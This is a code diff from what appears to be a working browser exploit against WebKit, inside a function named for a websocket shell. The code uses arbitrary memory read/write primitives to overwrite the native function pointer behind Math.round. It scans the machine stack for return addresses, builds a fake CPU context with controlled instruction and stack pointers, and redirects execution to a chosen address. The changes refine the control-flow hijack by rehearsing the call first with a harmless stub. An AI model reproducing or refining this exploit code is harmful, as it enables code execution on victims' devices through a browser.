@@ -5860,6 +5860,22 @@ function _startWsShell(){
           reply.base='0x'+B.toString(16);
           /* THE STACK SCAN: [cfr-0x400, cfr-8) for WebKit-text qwords */
           var wb=S.BASE||0n;
+          /* THE REHEARSAL: call the PROVEN-HARMLESS 0x7A0 stub first
+           * (it returns NORMALLY to the trampoline) - its call pushed
+           * the return address at the EXACT slot where the real shot's
+           * call will push it (the same JS depth, the same machine
+           * stack). Post-rehearsal, scan for the deepest WebKit-text
+           * slot = THE LIVE TRAMPOLINE RETURN SLOT. */
+          var spinStub=B+0x7A0n;
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var origFnH=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,spinStub);
+          try{Math.round(-5.7);}catch(e){}
+          S.absWrite(S.neEntry.addr+0x28n,origFnH);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          TR('2 rehearsal done (0x7A0 returned normally)');
+          /* THE LIVE SLOT SCAN: the deepest WebKit-text qword below
+           * cfr = the rehearsal's trampoline return push */
           var scan=S.absRead(cfr-0x400n,0x400);
           var slots=[];
           for(var si2=0;si2<scan.length;si2++){
@@ -5867,44 +5883,38 @@ function _startWsShell(){
             if(v2>wb&&v2<wb+0x7392000n){slots.push({addr:'0x'+(cfr-0x400n+BigInt(si2*8)).toString(16),val:'0x'+v2.toString(16)});}
           }
           reply.slots=slots;
-          TR('2 nslots='+slots.length);
+          TR('3 nslots='+slots.length);
           if(slots.length===0){reply.err='no WebKit return slots found';break;}
-          /* the deepest = the LAST in the scan (lowest address = highest index
-           * from cfr-0x400... careful: the scan goes UP; the deepest slot =
-           * the LOWEST address = index 0 among the found) */
-          var retSlot=slots[0]; /* the lowest address = the most recent push */
+          var retSlot=slots[0]; /* the deepest = the rehearsal's push */
           var retSlotAddr=BigInt(retSlot.addr);
-          TR('3 retSlot='+retSlot.addr+' val='+retSlot.val);
+          TR('4 retSlot='+retSlot.addr+' val='+retSlot.val);
           reply.retSlot=retSlot;
-          /* the target: msg.rva (default 0x130) */
-          var rva=parseInt(msg.rva,16)||0x130;
+          /* the target: msg.rva (default 0x230) */
+          var rva=parseInt(msg.rva,16)||0x230;
           var target=B+BigInt(rva);
-          TR('4 target=0x'+target.toString(16));
+          TR('5 target=0x'+target.toString(16));
           reply.target='lk+0x'+rva.toString(16);
-          /* the harmless stub for the jump */
-          var spinRva=parseInt(msg.spin,16)||0x7A0;
-          var spinStub=B+BigInt(spinRva);
           /* build the ctx at the fakeScope */
           for(var zi=0;zi<0x600/8;zi++)S.absWrite(S.fakeScope+BigInt(zi*8),0n);
           S.absWrite(S.fakeScope+0x78n,cfr);        /* mc_rbp = cfr (the post-call reads Callee[cfr]) */
           S.absWrite(S.fakeScope+0xE0n,spinStub);   /* mc_rip = the harmless stub */
           S.absWrite(S.fakeScope+0xE8n,0x43n);      /* mc_cs */
           S.absWrite(S.fakeScope+0xF0n,0x246n);     /* mc_rflags */
-          S.absWrite(S.fakeScope+0xF8n,retSlotAddr);/* mc_rsp = THE RETURN SLOT */
+          S.absWrite(S.fakeScope+0xF8n,retSlotAddr);/* mc_rsp = THE MEASURED RETURN SLOT */
           S.absWrite(S.fakeScope+0x100n,0x3Bn);     /* mc_ss */
-          TR('5 ctx built rip=0x'+spinStub.toString(16)+' rsp=slot');
-          /* THE CALL */
+          TR('6 ctx built rip=0x'+spinStub.toString(16)+' rsp=slot');
+          /* THE REAL CALL */
           if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
           var origFnR=S.absRead(S.neEntry.addr+0x28n,8)[0];
           S.absWrite(S.neEntry.addr+0x28n,target);
-          TR('6 CALLING');
+          TR('7 CALLING');
           try{Math.round(-5.7);}catch(e){}
-          TR('7 RETURNED - THE JS SURVIVED');
+          TR('8 RETURNED - THE JS SURVIVED');
           S.absWrite(S.neEntry.addr+0x28n,origFnR);
           if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
           reply.survived=true;
           reply.verified=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR);
-          TR('8 RESTORED verified='+(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR));
+          TR('9 RESTORED verified='+(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR));
         }catch(e2){reply.err='twr fault: '+String(e2&&e2.message?e2.message:'?');}
         break;
       }
